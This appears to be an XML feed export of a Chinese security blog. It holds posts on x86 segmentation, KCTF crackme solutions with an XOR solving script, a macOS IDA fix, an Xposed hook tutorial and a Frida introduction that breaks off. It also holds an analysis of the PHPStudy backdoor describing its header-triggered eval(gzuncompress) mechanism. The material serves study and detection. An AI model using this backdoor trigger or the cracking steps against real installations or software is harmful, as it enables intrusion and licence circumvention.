href="#探测Attribute是否存在" class="headerlink" title="探测Attribute是否存在"></a>探测Attribute是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, cs        mov ds, ax                        //ds == cs        mov dword ptr ds:[0x1000], eax    //对ds.base + 0x1000 地址进行操作就相当于对 cs.base + 0x1000 地址进行操作，但由于 cs 属性是不可写，所以编译出错。    }    return 0;}</code></pre><h5 id="探测Base是否存在"><a href="#探测Base是否存在" class="headerlink" title="探测Base是否存在"></a>探测Base是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, fs        mov ds, ax                   //ds == fs        mov dword ptr ds:[0], eax    //对ds.base + 0x0 地址进行操作就相当于对 fs.base + 0x0 地址进行操作        //等同 mov dword ptr [0x7FFDE000], eax ,正常情况下，我们对0地址是不能读也不能写，这里可以编译通过，是因为我们对地址 0x0x7FFDE000 进行写操作。将fs换成其余的段寄存器，就会报错    }    return 0;}</code></pre><h5 id="探测Limit是否存在"><a href="#探测Limit是否存在" class="headerlink" title="探测Limit是否存在"></a>探测Limit是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, fs        mov ds, ax                        //ds == fs        mov dword ptr ds:[0x1000], eax    //对ds.base + 0x1000 地址进行操作就相当于对 fs.base + 0x1000 地址进行操作，但由于 fs 支持的长度只是到0xFFF，0x1000 &gt; 0xFFF，所以编译出错。    }    return 0;}</code></pre><h3 id="段描述符与段选择子"><a href="#段描述符与段选择子" class="headerlink" title="段描述符与段选择子"></a>段描述符与段选择子</h3><h4 id="GDT-全局描述符表-与LDT-本地描述符表"><a href="#GDT-全局描述符表-与LDT-本地描述符表" class="headerlink" title="GDT(全局描述符表)与LDT(本地描述符表)"></a>GDT(全局描述符表)与LDT(本地描述符表)</h4><blockquote><p>windbg查看GDT表</p></blockquote><pre><code class="c">r gdtr  //查看GDT表的位置r gdtl  //查看GDT表的长度dd 0x80808080(地址) //查看指定地址的内容(四字节查看)dq 0x80808080(地址) //查看指定地址的内容(八字节查看)dq 0x80808080(地址) L40 //查看指定地址的内容(八字节查看)，显示40组</code></pre><h4 id="段选择子结构"><a href="#段选择子结构" class="headerlink" title="段选择子结构"></a>段选择子结构</h4><p><img src="/images/pasted-172.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="段描述符结构"><a href="#段描述符结构" class="headerlink" title="段描述符结构"></a>段描述符结构</h4><p><img src="/images/pasted-173.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-174.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-175.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">数据 E 拓展位    根据D/B位可知段的上限，0为64kb，1为4GB。    向上拓展        ds.base + limit 的红色区域是可用的    向下拓展        出了红色部分，其余是可用的代码 C 一致位    非一致代码段    一致代码段</code></pre><h3 id="段权限检查"><a href="#段权限检查" class="headerlink" title="段权限检查"></a>段权限检查</h3><blockquote><p>CPU分为四个级别R0、R1、R2、R3(操作系统并没有使用R1、R2)，R0运行内核记驱动程序，R3运行用户层程序。</p></blockquote><p><code>CPL：当前特权级别</code></p><pre><code class="c">根据CS、SS的段选择子的RPL值可知道CPL的值假设CS为0x001B（0000 0000 0001 1011）RPL为3，所以CPL为3，所以应用程序运行在3环，是用户层程序。数据段的权限检查    检查CPL权限是否大于等于DPL，RPL权限是否大于等于DPL    假设CPL = 0    mov ax，000B    mov ds，ax       //RPL = 3，指向的段描述符的DPL为0    CPL权限与DPL相同，检测通过，RPL权限比DPL权限低，检测失败代码段、系统描述符的权限检查与数据段不完全相同，后面会学习到。</code></pre><h3 id="段寄存器的操作"><a href="#段寄存器的操作" class="headerlink" title="段寄存器的操作"></a>段寄存器的操作</h3><blockquote><p>mov ds, ax //ds的值不能乱给，需要符合段选择子</p></blockquote><blockquote><p>除了mov指令还可以使用 LES，LSS，LDS，LFS，LGS指令修改段寄存器的值</p></blockquote><blockquote><p>没有LCS是因为更改CS涉及到更改EIP。</p></blockquote><pre><code class="c">例：    les ecx, fword ptr ds:[0x1000] //将ds.base + 0x1000 地址处的内容的高两个字节放入es，剩下四个字节放入ecx。fwrod（6字节）假设ax = 0x001B（0000 0000 0001 1011）所以：RPL = 3（请求特权级别为3，由11给出）     所要查询的表是GDT表（由 0 给出）     指定获取表中下标为3的段描述符（由0000 0000 0001 1给出,假设为 0x004F9AFF`0xFFFFFFFF）     根据段描述符可得         段基地址：0x00FFFFFF        段极限：0x000FFFFF(G位为0，所以在前面填充12个0)        段的属性：0x4F9A</code></pre><h3 id="回过头，在看一下段寄存器的结构"><a href="#回过头，在看一下段寄存器的结构" class="headerlink" title="回过头，在看一下段寄存器的结构"></a>回过头，在看一下段寄存器的结构</h3><pre><code class="c">struct SegMent{    WORD Selecter,   16bit//可见部分 段选择子         指向的是段选择子结构    WROD Attribute,  16bit//属性   可读/可写/可执行   指向的是段描述符结构的 G + D/B + L + AVL + 段界限0 + P + DPL + S + TYPE    DWORD Base,      32bit//Base  段的起始地址       指向的是段描述符结构的 段基地址0 + 段基地址1 + 段基地址2    DWORD Limit      32bit//Limit 段极限             指向的是段描述符结构的 段界限0 + 段界限1 合起来是20位，根据 G 位的值，若为0，则在其前面填充12位的0，最大就为0x000FFFFF，若为1，则在其后面填充12位的1，最大就为0xFFFFFFFF};虽然只能可见部分只有16bit，但是通过它去查找GDT/LDT表，就能获得其余80bit的值</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>学习完这些，能够知道RPL、DPL、CPL分别只什么，怎么找到，段选择子与段描述符的结构以及每一位的作用，如何找到DGT/LDT表，能够按顺序背下ES、CS、SS、DS、FS、GS、LSTR、TR的名字，给一个段选择子能够分析出段的其余80bit的值。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16
      
    
    </summary>
    
      <category term="保护机制" scheme="https://bufsnake.github.io/categories/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
    
      <category term="段的机制" scheme="https://bufsnake.github.io/tags/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>KCTF-1</title>
    <link href="https://bufsnake.github.io/KCTF-1.html"/>
    <id>https://bufsnake.github.io/KCTF-1.html</id>
    <published>2019-10-01T14:01:53.000Z</published>
    <updated>2019-11-25T09:42:53.196Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="初世纪"><a href="#初世纪" class="headerlink" title="初世纪"></a>初世纪</h3><p><img src="/images/pasted-152.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入不正确就会出现这个弹窗</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><h5 id="定位WinMain函数"><a href="#定位WinMain函数" class="headerlink" title="定位WinMain函数"></a>定位WinMain函数</h5><p><img src="/images/pasted-153.png" srcset="/img/loading.gif" alt="upload successful"></p><h5 id="找到DialogBoxParam的回调函数"><a href="#找到DialogBoxParam的回调函数" class="headerlink" title="找到DialogBoxParam的回调函数"></a>找到DialogBoxParam的回调函数</h5><p><img src="/images/pasted-154.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">函数原型：    int DialogBoxParam（HINSTANCE hInstance，LPCTSTR IpTemplateName,HWND hWndParent， DLGPROC IPDialogFunc,LPARAM dwlnitParam）；参数：hlnstance       标识一个模块的实例，该模块的可执行文件含有对话框模板。IpTemplateName  标识对话框模板。此参数可以指向一个以NULL结尾的字符串的指针,该字符串指定对话框模扳名，或是指定对话框模板的资源标识符的一个整型值。如果此参数指定了一个资源标识符，则它的高位字一定为零，且低位字一定含有标识符。一定用MAKEINTRESOURCE宏指令创建此值。hWndParent      指定拥有对话框的窗口。IpDialogFunc    指向对话框过程的指针。dwInitParam     指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值。返回值 如果函数调用成功则返回值为在对函数EndDialog的调用中的nResult参数，该EndDialog函数用于中止对话框。如果函数调用失败，则返回值为-1。</code></pre><h5 id="F5大法定位关键代码"><a href="#F5大法定位关键代码" class="headerlink" title="F5大法定位关键代码"></a>F5大法定位关键代码</h5><p><img src="/images/pasted-155.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-156.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">函数功能：该函数获取对话框中与控制有关的文本或标题。函数原型    UINT GetDlgltemText(HWND hDlg,int nlDDlltem,LPTSTR IpString int nMazCount);参数    hDlg       指向含有控制的对话框的句柄。    nlDDlgltem 指定标题或文本将被检索的控制的标识符。    IpString   指向获取标题或文本的缓冲器的指针。    nMaxCount  指定被复制到lpString参数指向的缓冲区的字符串的最大长度。如果字符串的字符最大长度超过范围，则该字符串被截断。返回值 如果函数调用成功，则返回值表示被复制缓冲区的字符串的长度，不包括以NULL结尾的字符串。如果函数调用失败,则返回值为零。若想获得更多错误信息，请调用GetLastError函数。</code></pre><blockquote><p>得到注册码为6Ewi9H</p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-157.png" srcset="/img/loading.gif" alt="upload successful"></p><hr><h3 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h3><p><img src="/images/pasted-158.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="OD调试之"><a href="#OD调试之" class="headerlink" title="OD调试之"></a>OD调试之</h4><p><img src="/images/pasted-159.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>通过字符串找到关键点</p></blockquote><p><img src="/images/pasted-160.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看出来一些流程，输入字符串，得到长度，然后判断是否在10～30之间，将字符串copy到另外一个地方，比较字符串的第八个位置是否为’A’。</p></blockquote><p><img src="/images/pasted-161.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>进入此函数</p></blockquote><p><img src="/images/pasted-162.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>该函数的逻辑是：将输入的第七个字符串换成’#’，字符串的每位都与0x1F进行xor运算。然后下面没有思路了</p></blockquote><h4 id="IDA查看之"><a href="#IDA查看之" class="headerlink" title="IDA查看之"></a>IDA查看之</h4><p><img src="/images/pasted-163.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>找到字符串(将字符串复制到的地址)的交叉引用，挨个扫一眼</p></blockquote><p><img src="/images/pasted-164.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看到这一个函数</p></blockquote><p><img src="/images/pasted-165.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>找到该函数的交叉引用</p></blockquote><p><img src="/images/pasted-166.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看到第二个参数就是’invalid argument’</p></blockquote><p><img src="/images/pasted-167.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>关键比较处，a2就是’invalid argument’ ^ 28后的结果，dword_2F3088就是我们输入字符串复制到的地址</p></blockquote><blockquote><p>在关键部分下断点，可以得到比较的字符串</p></blockquote><p><img src="/images/pasted-168.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>到此，程序整体逻辑也就明了了，输入字符串，判断第八位是否为A，将第八位换成#，整体字符在与 0x1f 异或，得到的字符 和 ‘invalid argument’与28异或后的结果相比较</p></blockquote><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre><code class="bash">In [1]: flag = &quot;invalid argument&quot;In [2]: temp = &#39;&#39;In [3]: for i in range(0,len(flag)):   ...:     temp += chr(ord(flag[i]) ^ 28)In [4]: tempOut[4]: &#39;urj}pux&lt;}n{iqyrh&#39;In [5]: for i in range(0,len(temp)):   ...:     flag += chr(ord(temp[i]) ^ 0x1f)In [6]: flag = &#39;&#39;In [7]: for i in range(0,len(temp)):   ...:     flag += chr(ord(temp[i]) ^ 0x1f)In [8]: flagOut[8]: &#39;jmubojg#bqdvnfmw&#39;# 最后将#换成&#39;A&#39;即可</code></pre><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-169.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>KCTF的题目质量是真的好，准备把这几年的比赛题目都拿来做做，学习学习，还是有很多姿势的。。。。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h3 id=&quot;初世纪&quot;&gt;&lt;a href=&quot;#初世纪&quot; class=&quot;headerlink&quot; title=&quot;初世纪&quot;&gt;&lt;/a&gt;初世纪&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-152.png&quot; srcset=&quot;/img/loading.gif&quot; a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MacOS上IDA pro的小问题修复</title>
    <link href="https://bufsnake.github.io/MacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html"/>
    <id>https://bufsnake.github.io/MacOS-IDA-pro-致最傻的我.html</id>
    <published>2019-09-30T13:04:55.000Z</published>
    <updated>2019-11-25T09:42:53.184Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才知道是个啥情况，这里简单记录一下。</p></blockquote><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p><img src="/images/pasted-145.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>第一次遇到文件权限后门带@的，以为是这个问题，然后就疯狂Google，才得知这是Mac OS X文件系统的附加属性</p></blockquote><blockquote><p>文件的读写权限中被加上了一个@符号，这就是 Mac OS X 文件系统的附加属性（extended attributes）</p></blockquote><blockquote><p>这个属性下，打开文件显示错误为：项目“XXX”已被OS X 使用，不能打开</p></blockquote><h4 id="xattr"><a href="#xattr" class="headerlink" title="xattr"></a>xattr</h4><pre><code class="bash">xattr -c filename # 可以清除这个附加属性</code></pre><blockquote><p>天真的以为清除附加属性后，打开就没有问题了，然而，我错了。还是没能解决</p></blockquote><h3 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h3><p><img src="/images/pasted-146.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-147.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>出现签名的问题，然后又是一番疯狂Google</p></blockquote><p><img src="/images/pasted-148.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>允许应用控制电脑，所以每次打开应用Mac OS X都会检测程序的签名问题。可能是因为我的IDA补丁的问题。</p></blockquote><p><img src="/images/pasted-149.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>取消勾选 允许应用控制电脑 即可解决问题。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>困扰了有两个月了，搞得我都对那个程序有些恐惧，都不想打开它，今天终于解决了。学到姿势了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才
      
    
    </summary>
    
      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
    
    
      <category term="MacOS IDA" scheme="https://bufsnake.github.io/tags/MacOS-IDA/"/>
    
  </entry>
  
  <entry>
    <title>PHPStudy后门研究</title>
    <link href="https://bufsnake.github.io/PHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html"/>
    <id>https://bufsnake.github.io/PHPStudy后门研究.html</id>
    <published>2019-09-25T04:07:14.000Z</published>
    <updated>2019-11-25T09:42:53.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote><hr><h3 id="PHPStudy-后门文件"><a href="#PHPStudy-后门文件" class="headerlink" title="PHPStudy 后门文件"></a>PHPStudy 后门文件</h3><blockquote><p>php/ext目录下的php_xmlrpc.dll文件 。</p></blockquote><p><img src="/images/pasted-139.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="检测是否存在后门"><a href="#检测是否存在后门" class="headerlink" title="检测是否存在后门"></a>检测是否存在后门</h3><blockquote><p>记事本打开文件，查看是否存在如下所示的字符串，如果有说明存在后门，可升级官方最新版。</p></blockquote><p><img src="/images/pasted-140.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="IDA分析后门文件"><a href="#IDA分析后门文件" class="headerlink" title="IDA分析后门文件"></a>IDA分析后门文件</h3><blockquote><p>根据字符串信息，快速定位关键函数</p></blockquote><p><img src="/images/pasted-141.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-142.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-143.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>根据判断请求头的Accept-Encoding是否为gzip,deflate进行判断Accept-Charset的值base64解密是否成功，如果成功就对它进行gzcompress压缩，然后执行@eval(gzuncompress(data));</p></blockquote><h3 id="相关检测脚本"><a href="#相关检测脚本" class="headerlink" title="相关检测脚本"></a>相关检测脚本</h3><blockquote><p>github已经有大佬上传了，需要研究学习的朋友，可以自己搜索</p></blockquote><hr><blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;PHPStudy-后门文件&quot;&gt;&lt;a href=&quot;#PHPStudy-后门文件&quot; cl
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="phpstudy后门" scheme="https://bufsnake.github.io/tags/phpstudy%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>模2运算</title>
    <link href="https://bufsnake.github.io/%E6%A8%A12%E8%BF%90%E7%AE%97.html"/>
    <id>https://bufsnake.github.io/模2运算.html</id>
    <published>2019-09-17T10:13:39.000Z</published>
    <updated>2019-11-25T09:42:53.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="模2运算"><a href="#模2运算" class="headerlink" title="模2运算"></a>模2运算</h2><blockquote><p>简介：将数字换算成二进制的形式进行运算，无进位也无借位。</p></blockquote><h2 id="模2加法"><a href="#模2加法" class="headerlink" title="模2加法"></a>模2加法</h2><pre><code class="c">1 + 1 = 01 + 0 = 10 + 1 = 10 + 0 = 0    1010101+   1000101————————————    0010000    10101011+   10100111+   11100010————————————    11101110奇数个1相加得1，偶数个1相加得0    </code></pre><h2 id="模2减法"><a href="#模2减法" class="headerlink" title="模2减法"></a>模2减法</h2><pre><code class="c">1 - 1 = 01 - 0 = 10 - 1 = 10 - 0 = 0    1010101-   1000101————————————    0010000    10101011-   10100111-   11100010————————————    11101110    </code></pre><h2 id="模2乘法"><a href="#模2乘法" class="headerlink" title="模2乘法"></a>模2乘法</h2><pre><code class="c">1 x 1 = 11 x 0 = 00 x 1 = 00 x 0 = 0    1010101x   1000101————————————    1000101</code></pre><h2 id="模2除法"><a href="#模2除法" class="headerlink" title="模2除法"></a>模2除法</h2><pre><code class="c">运算的时候每位都进行xor运算规则：被除数除以除数,被除数首位为1时,商1,为0时商0     所得余数去除首位(左移一位)     重复上一步直到被除数位数少于除数位数例子：1111000对除数1101做模2除法:         1011             商     ------------1101/ 1111000             被除数 首位为1，商为1      1101                除数     ------------      0010000             余数去除首位,作为新的被除数，首位为0，商为0       0000               被除数首位为0，则除数就为0     ------------       010000             余数去除首位,作为新的被除数，首位为1，商为1        1101              被除数首位为1,除以除数      ------------        01010             余数去除首位,作为新的被除数，首位为1，商为1         1101             被除数首位为1,除以除数       ------------         0111             余数去除首位，为111位数为3，小于除数位数4，不再进行运算，得到结果结果：商1011余111        </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;模2运算&quot;&gt;&lt;a href=&quot;#模2运算&quot; class=&quot;headerlink&quot; title=&quot;模2运算&quot;&gt;&lt;/a&gt;模2运算&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;简介：将数字换算成二进制的形式进行运算，无进位也无借位。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
      <category term="crypto" scheme="https://bufsnake.github.io/categories/crypto/"/>
    
    
      <category term="misc" scheme="https://bufsnake.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Xposed hook框架学习</title>
    <link href="https://bufsnake.github.io/Xposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://bufsnake.github.io/Xposed-hook框架学习.html</id>
    <published>2019-09-09T10:11:11.000Z</published>
    <updated>2019-11-25T09:42:53.148Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Xposed-安装"><a href="#Xposed-安装" class="headerlink" title="Xposed 安装"></a>Xposed 安装</h3><p><a href="http://dl-xda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk" target="_blank" rel="noopener">xposed.apk</a></p><p><img src="/images/pasted-127.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p><img src="/images/pasted-128.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>初次运行是点击 安装/更新 就行了，后续在激活模块的时候可以点击 软重启 重启手机(模拟器)</p></blockquote><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><img src="/images/pasted-129.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>显示已安装的模块，打勾的说明是已经激活的</p></blockquote><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><img src="/images/pasted-130.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>显示网上已经有的模块，别人开发好的，可以直接拿过来用的那种</p></blockquote><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p><img src="/images/pasted-131.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p><img src="/images/pasted-132.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>显示模块运行时后的日志信息，可用来显示XposedBridge.log(“”);打印出来的消息</p></blockquote><h4 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h4><p><img src="/images/pasted-133.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="第一个模块学习"><a href="#第一个模块学习" class="headerlink" title="第一个模块学习"></a>第一个模块学习</h3><h4 id="在build-gradle中添加信息"><a href="#在build-gradle中添加信息" class="headerlink" title="在build.gradle中添加信息"></a>在build.gradle中添加信息</h4><pre><code class="python">compileOnly &#39;de.robv.android.xposed:api:82&#39;compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;</code></pre><p><img src="/images/pasted-134.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>导入框架需要的依赖</p></blockquote><h4 id="AndroidManifest-xml添加如下信息"><a href="#AndroidManifest-xml添加如下信息" class="headerlink" title="AndroidManifest.xml添加如下信息"></a>AndroidManifest.xml添加如下信息</h4><p><img src="/images/pasted-135.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="xml">&lt;meta-data    android:name=&quot;xposedmodule&quot;        该程序是否是xposed的模块    android:value=&quot;true&quot; /&gt;&lt;meta-data    android:name=&quot;xposeddescription&quot;   对本模块的功能的描述，可以自己简单的描述一下可以了    android:value=&quot;Module测试&quot; /&gt;&lt;meta-data    android:name=&quot;xposedminversion&quot;    是本模块开发时用到的Xposed的jar包最低版本号    android:value=&quot;54&quot; /&gt;</code></pre><blockquote><p>注意该段代码的放置位置</p></blockquote><h4 id="添加模块的入口函数"><a href="#添加模块的入口函数" class="headerlink" title="添加模块的入口函数"></a>添加模块的入口函数</h4><p><img src="/images/pasted-136.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-137.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>新建一个类，为Xposed模块的主类，新建一个assets目录，在目录下创建一个file xposed_init，里面添上模块入口函数的路径</p></blockquote><h4 id="编写模块的主要代码"><a href="#编写模块的主要代码" class="headerlink" title="编写模块的主要代码"></a>编写模块的主要代码</h4><pre><code class="java">package com.example.info;import android.widget.TextView;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage;public class Main implements IXposedHookLoadPackage {    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {        if(lpparam.packageName.equals(&quot;com.example.helloworld&quot;)){            XposedHelpers.findAndHookMethod(TextView.class, &quot;setText&quot;,CharSequence.class, new XC_MethodHook() {                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {                    param.args[0] = &quot;isHookedbe&quot;;                }                protected void afterHookedMethod(MethodHookParam param) throws Throwable {                    param.args[0] = &quot;isHookedaf&quot;;                }            });        }    }}</code></pre><blockquote><p>作用是HOOK TextView的setText方法</p></blockquote><h4 id="被Hook的程序的MainActivity"><a href="#被Hook的程序的MainActivity" class="headerlink" title="被Hook的程序的MainActivity"></a>被Hook的程序的MainActivity</h4><pre><code class="java">package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity {    private Button b;    private TextView t;    @Override    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        b = (Button)findViewById(R.id.button);        t = (TextView)findViewById(R.id.textView);        b.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View view) {                t.setText(&quot;aaaaaaaaaaaaaaa&quot;);            }        });    }}</code></pre><blockquote><p>在点击程序后本应该会显示aaaaaaaaaaaaaaa，hook之后会显示isHookedbe</p></blockquote><h4 id="看图"><a href="#看图" class="headerlink" title="看图"></a>看图</h4><p><img src="/images/pasted-138.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>先Hook成功一个案例，然后实现各种操作吧，可以看看官方的api</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Xposed-安装&quot;&gt;&lt;a href=&quot;#Xposed-安装&quot; class=&quot;headerlink&quot; title=&quot;Xposed 安装&quot;&gt;&lt;/a&gt;Xposed 安装&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://dl-xda.xposed.info/modules
      
    
    </summary>
    
      <category term="android" scheme="https://bufsnake.github.io/categories/android/"/>
    
    
      <category term="xposed框架" scheme="https://bufsnake.github.io/tags/xposed%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>frida Hook神器学习-1</title>
    <link href="https://bufsnake.github.io/frida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html"/>
    <id>https://bufsnake.github.io/frida-Hook神器学习-1.html</id>
    <published>2019-08-26T14:03:48.000Z</published>
    <updated>2019-12-09T05:16:03.841Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android三大框架对比"><a href="#Android三大框架对比" class="headerlink" title="Android三大框架对比"></a>Android三大框架对比</h3><h4 id="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："><a href="#Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：" class="headerlink" title="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："></a>Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：</h4><h6 id="Xposed的优缺点"><a href="#Xposed的优缺点" class="headerlink" title="Xposed的优缺点"></a>Xposed的优缺点</h6><blockquote><p>优点：在编写Java层hook插件的时候非常好用，这一点完全优越于Frida和SubstrateCydia，因为他也是Android项目，可以直接编写Java代码调用各类api进行操作。而且可以安装到手机上直接使用。</p></blockquote><blockquote><p>缺点：配置安装环境繁琐，兼容性差，在Hook底层的时候就很无助了。</p></blockquote><h5 id="Frida的优缺点"><a href="#Frida的优缺点" class="headerlink" 